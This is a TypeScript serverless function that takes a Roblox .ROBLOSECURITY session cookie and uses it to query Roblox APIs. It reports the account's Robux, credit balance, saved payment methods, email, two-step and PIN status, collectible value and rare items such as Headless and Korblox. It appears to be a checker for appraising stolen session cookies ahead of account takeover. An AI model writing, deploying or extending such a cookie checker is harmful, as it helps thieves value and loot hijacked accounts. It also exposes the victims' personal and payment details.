import { corsHeaders } from 'npm:@supabase/supabase-js@2/cors';

async function rbx(url: string, cookie: string, init: RequestInit = {}) {
  return fetch(url, {
    ...init,
    headers: {
      ...(init.headers || {}),
      Cookie: `.ROBLOSECURITY=${cookie}`,
      'User-Agent': 'Roblox/WinInet',
      Accept: 'application/json',
    },
  });
}

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    const { cookie } = await req.json();
    if (!cookie || typeof cookie !== 'string') {
      return new Response(JSON.stringify({ error: 'Missing cookie' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const info: Record<string, string | number | undefined> = {};

    // 1. Authenticated user
    const authRes = await rbx('https://users.roblox.com/v1/users/authenticated', cookie);
    if (!authRes.ok) {
      return new Response(JSON.stringify({ valid: false, error: 'Invalid cookie' }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }
    const me = await authRes.json();
    info.username = me.name;
    info.displayName = me.displayName;
    info.userId = me.id;

    // Run independent calls in parallel
    const [
      userRes,
      currencyRes,
      premiumRes,
      summaryRes,
      pendingRes,
      groupsRes,
      voiceRes,
      pinRes,
      twoStepRes,
      emailRes,
      phoneRes,
      creditRes,
      savedPaymentRes,
    ] = await Promise.all([
      rbx(`https://users.roblox.com/v1/users/${me.id}`, cookie),
      rbx(`https://economy.roblox.com/v1/users/${me.id}/currency`, cookie),
      rbx(`https://premiumfeatures.roblox.com/v1/users/${me.id}/validate-membership`, cookie),
      rbx(`https://economy.roblox.com/v2/users/${me.id}/transaction-totals?timeFrame=Year&transactionType=summary`, cookie),
      rbx(`https://www.roblox.com/my/account/PendingTransactions.json`, cookie).catch(() => null),
      rbx(`https://groups.roblox.com/v2/users/${me.id}/groups/roles`, cookie),
      rbx('https://voice.roblox.com/v1/settings', cookie).catch(() => null),
      rbx('https://auth.roblox.com/v1/account/pin', cookie).catch(() => null),
      rbx(`https://twostepverification.roblox.com/v1/users/${me.id}/configuration`, cookie).catch(() => null),
      rbx('https://accountsettings.roblox.com/v1/email', cookie).catch(() => null),
      rbx('https://accountinformation.roblox.com/v1/phone', cookie).catch(() => null),
      rbx('https://billing.roblox.com/v1/credit', cookie).catch(() => null),
      rbx('https://billing.roblox.com/v1/payment-methods', cookie).catch(() => null),
    ]);

    if (userRes.ok) {
      const u = await userRes.json();
      if (u.created) {
        const days = Math.floor((Date.now() - new Date(u.created).getTime()) / 86400000);
        info.age = `${days} days`;
      }
    }

    if (currencyRes.ok) {
      const c = await currencyRes.json();
      info.robux = String(c.robux ?? 0);
    }

    if (premiumRes.ok) {
      const p = await premiumRes.json();
      info.premium = p === true ? 'Yes' : 'No';
    }

    if (summaryRes.ok) {
      const s = await summaryRes.json();
      info.summary = `Sales: ${s.salesTotal ?? 0} | Purchases: ${s.purchasesTotal ?? 0}`;
    }

    if (pendingRes && pendingRes.ok) {
      try {
        const p = await pendingRes.json();
        info.pendingRobux = String(p.RobuxAmount ?? p.robuxAmount ?? 0);
      } catch { /* ignore */ }
    }

    if (groupsRes.ok) {
      const g = await groupsRes.json();
      const owned = (g.data || []).filter((row: any) => row.role?.rank === 255).length;
      info.groupsOwned = String(owned);
    }

    if (voiceRes && voiceRes.ok) {
      try {
        const v = await voiceRes.json();
        info.voiceChat = v.isVoiceEnabled ? 'Enabled' : 'Disabled';
      } catch { /* ignore */ }
    }

    if (pinRes && pinRes.ok) {
      try {
        const p = await pinRes.json();
        info.pin = p.isEnabled ? 'Enabled' : 'Disabled';
      } catch { /* ignore */ }
    }

    if (twoStepRes && twoStepRes.ok) {
      try {
        const t = await twoStepRes.json();
        const methods = (t.methods || []).filter((m: any) => m.enabled).map((m: any) => m.mediaType);
        info.twoStepVerification = methods.length ? methods.join(', ') : 'Disabled';
      } catch { /* ignore */ }
    }

    if (emailRes && emailRes.ok) {
      try {
        const e = await emailRes.json();
        info.emailVerified = e.verified ? `Verified (${e.emailAddress || ''})` : 'Not verified';
      } catch { /* ignore */ }
    }

    if (phoneRes && phoneRes.ok) {
      try {
        const p = await phoneRes.json();
        info.phoneVerified = p.verified ? 'Verified' : 'Not verified';
      } catch { /* ignore */ }
    }

    if (creditRes && creditRes.ok) {
      try {
        const c = await creditRes.json();
        info.creditBalance = `${c.balance ?? 0} ${c.currencyCode || 'USD'}`;
      } catch { /* ignore */ }
    }

    if (savedPaymentRes && savedPaymentRes.ok) {
      try {
        const s = await savedPaymentRes.json();
        const count = (s.paymentMethods || s.data || []).length;
        info.savedPayment = count > 0 ? `${count} saved` : 'None';
      } catch { /* ignore */ }
    }

    // Collectibles / RAP / Korblox / Headless
    try {
      const collectiblesRes = await rbx(`https://inventory.roblox.com/v1/users/${me.id}/assets/collectibles?limit=100`, cookie);
      if (collectiblesRes.ok) {
        const col = await collectiblesRes.json();
        const items = col.data || [];
        const totalRap = items.reduce((acc: number, i: any) => acc + (i.recentAveragePrice || 0), 0);
        info.rap = String(totalRap);
        info.inventory = `${items.length} collectibles`;
      }

      const HEADLESS_ID = 134082579;
      const KORBLOX_IDS = [139607718, 139607625];
      let korbloxNote = '';
      const headlessOwned = await rbx(`https://inventory.roblox.com/v1/users/${me.id}/items/Asset/${HEADLESS_ID}`, cookie);
      if (headlessOwned.ok) {
        const j = await headlessOwned.json();
        if ((j.data || []).length > 0) korbloxNote = 'Headless';
      }
      for (const id of KORBLOX_IDS) {
        const r = await rbx(`https://inventory.roblox.com/v1/users/${me.id}/items/Asset/${id}`, cookie);
        if (r.ok) {
          const j = await r.json();
          if ((j.data || []).length > 0) {
            korbloxNote = korbloxNote ? `${korbloxNote} + Korblox` : 'Korblox';
            break;
          }
        }
      }
      info.korblox = korbloxNote || 'None';
    } catch { /* ignore */ }

    // Place visits + games
    try {
      const gamesRes = await rbx(`https://games.roblox.com/v2/users/${me.id}/games?limit=50&sortOrder=Asc`, cookie);
      if (gamesRes.ok) {
        const g = await gamesRes.json();
        const visits = (g.data || []).reduce((a: number, x: any) => a + (x.placeVisits || 0), 0);
        info.placeVisits = visits.toLocaleString();
        info.passes = `${(g.data || []).length} games`;
      }
    } catch { /* ignore */ }

    return new Response(JSON.stringify({ valid: true, info }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: String(err) }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});